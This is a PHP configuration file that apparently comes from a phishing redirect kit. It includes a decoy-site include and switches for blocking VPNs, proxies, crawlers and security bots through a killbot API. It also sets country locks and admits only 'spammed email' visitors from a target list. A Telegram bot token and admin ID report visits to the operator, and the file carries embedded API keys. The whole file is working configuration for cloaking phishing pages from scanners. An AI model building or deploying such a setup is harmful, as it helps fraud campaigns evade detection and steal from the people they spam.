<?php
include('fakesites.php');
$activated = 'yuw83298745e';
// as possible as you can  , avoid activating all switchs


//free ip_protection Limit 1000 request 

$proxy_block = false;   //block proxy ip or vpn 
$activate_proxy_risk = false;
$proxy_risk = 70;  // allow proxy if below risk value 
$fuck1 = ('id');  // please change this to match script.txt fuck 1
$fuck2 = ('https://www.ebay.com/itm/362768766864#');  // please change this to match script.txt fuck2


// please turn of ip_protection to use this for best performamce 

$kill_bot_active = false; //activate Killbot.org,    make sure to add your api 
$kill_bot_api = 'unktrutNkXpag9CKlqhqNbM0NCkRJVebB5kibp9415gME';   // if you plan to use https://killbot.org/
$onetime_access = false; // change to true to allow ip access once 
$emailaccess_only = false;  // change to true to allow only spammed email access  format  ?data=email@email.com
$crawler_bot = true; // prevent crawing bot access 
$country_lock = false;  //lock your page to a country 
$country_code = ["FR", "UK", "US", "GO"];  // enter short code of country here and lock your page to it   // view code list http://www.analysespider.com/ip2country/country_code.html



$useragent = 'Chrome'; //useragent for checking urls
const REDIRECT_TYPE = 2; // 1:header - 2:script
const URLS_FILE = 'urls.txt';
const EMAIL_LIST = 'email/lists.txt';
$FAILED_PAGE_URL = $multiple_url; // switch here with $multiple_url or $errorpage
const TELEGRAM_BOT_TOKEN = '1413261703:AAEcKf50z953W7duG0tISO-5NK4cPmdT_ZI';
const TELEGRAM_BOT_ADMIN_USERID = 151588551;
const TELEGRAM_BOT_REPORT_EVERY_TIME = false;


?>
